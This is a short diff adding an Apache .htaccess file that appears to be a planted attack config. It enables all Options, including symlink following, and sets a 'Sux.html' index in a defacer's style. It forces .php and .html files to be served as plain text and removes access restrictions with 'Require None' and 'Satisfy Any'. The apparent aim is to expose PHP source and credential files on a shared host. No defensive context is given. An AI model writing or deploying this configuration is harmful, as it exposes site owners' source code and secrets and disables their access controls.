@@ -1,0 +1,8 @@
+Options all 
+ DirectoryIndex Sux.html 
+ AddType Text/plain .php 
+ AddHandler Server-parsed .php 
+  AddType Text/plain .html 
+ AddHandler txt .html 
+ Require None 
+ Satisfy Any
